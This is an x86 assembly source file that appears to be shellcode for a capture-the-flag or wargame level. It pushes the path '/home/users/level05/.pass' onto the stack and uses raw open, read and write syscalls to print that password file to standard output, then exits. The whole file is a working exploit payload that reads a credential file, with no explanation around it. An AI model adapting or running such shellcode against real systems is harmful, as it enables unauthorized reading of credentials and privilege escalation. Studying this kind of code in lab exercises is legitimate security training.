.global main;

.text
main:
    # Push '/home/users/level05/.pass' on the stack
	push $0x73
	push $0x7361702e
	push $0x2f35306c
	push $0x6576656c
	push $0x2f737265
	push $0x73752f65
	push $0x6d6f682f

    # Open
    mov $5, %al;
    mov %esp, %ebx;
    xor %ecx, %ecx;
    xor %edx, %edx;
    int $0x80;

    # Read
    mov %eax, %ebx;
    mov $3, %al;
    sub $42, %esp;
    mov %esp, %ecx;
    mov $42, %dl;
    int $0x80;

    # Write
    mov $4, %al;
    mov $1, %bl;
    mov %esp, %ecx;
    mov $42, %dl;
    int $0x80;

    # Exit
    mov $1, %al;
    int $0x80;
